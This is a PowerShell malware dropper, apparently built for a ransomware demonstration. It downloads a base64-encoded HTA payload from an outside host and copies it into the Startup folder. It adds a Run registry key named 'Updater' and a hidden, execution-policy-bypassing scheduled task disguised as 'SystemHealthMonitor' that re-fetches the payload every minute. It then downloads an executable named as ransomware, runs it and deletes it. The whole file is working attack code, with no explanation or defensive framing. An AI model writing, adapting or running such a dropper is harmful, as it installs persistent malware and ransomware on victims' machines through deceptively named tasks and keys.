function DownloadFile {

    $Base64String = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/baesenseii/publicdata/refs/heads/main/123data.txt').Content;
    $DecodedBytes = [System.Convert]::FromBase64String($Base64String)
    [System.IO.File]::WriteAllBytes("$env:TEMP\msg.hta", $decodedBytes)
    Copy-Item "$env:TEMP\msg.hta" "$env:LOCALAPPDATA\backup.hta"
    Copy-Item "$env:TEMP\msg.hta" "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msg2.hta"
}

function AddToRegistry {
    $keyPath1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $keyName1 = "Updater"
    $keyValue1 = "$env:TEMP\msg.hta"
    if (Get-ItemProperty -Path $keyPath1 -Name $keyName1 -ErrorAction SilentlyContinue)
    {
     Write-Output "Registry value exists"
    }
    else {
    
        New-ItemProperty -Path $keyPath1 -Name $keyName1 -Value $keyValue1
    }
}

function CreateScheduledTask {

    # Create action object pointing to our command

    $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command {$tempPath="$env:TEMP\msg.hta";$localBackupPath="$env:LOCALAPPDATA\backup.hta"; $startupPath="$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msg2.hta";
            if(!(Test-Path $tempPath)) {

                $Base64String = (Invoke-WebRequest -Uri https://raw.githubusercontent.com/baesenseii/publicdata/refs/heads/main/123data.txt).Content;
                $DecodedBytes = [System.Convert]::FromBase64String($Base64String)
                [System.IO.File]::WriteAllBytes($tempPath, $decodedBytes)

            }


            if(!(Test-Path $localBackupPath)) {

                Copy-Item $tempPath $localBackupPath;

            }


            if(!(Test-Path $startupPath)) {

                Copy-Item $tempPath $startupPath;

            } }'


    # Create trigger object set to run every minute

    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)

    # Register the scheduled task

    Register-ScheduledTask -TaskName "SystemHealthMonitor" -Description "Monitors critical system files." -Action $action -Trigger $trigger

}

function CheckForRware {
    if (!(Test-Path "$env:TEMP\rware.exe")) {
        Invoke-WebRequest -Uri "https://storage.googleapis.com/tpohdemo_rware/Crypto.exe" -OutFile "$env:TEMP\rware.exe"
    }
}

function ExecuteAndDelete {
    # Only execute if the file exists
    if(Test-Path "$env:TEMP\rware.exe") {
        Start-Process "$env:TEMP\rware.exe" -Wait
        
        # Wait until process exits before deleting
        Start-Sleep -Seconds 5
        
        # Delete the executable once executed
        Remove-Item "$env:TEMP\rware.exe" -Force
    }
}

# Execute all functions in order
DownloadFile
AddToRegistry
CreateScheduledTask
CheckForRware
ExecuteAndDelete

& "$env:TEMP\msg.hta"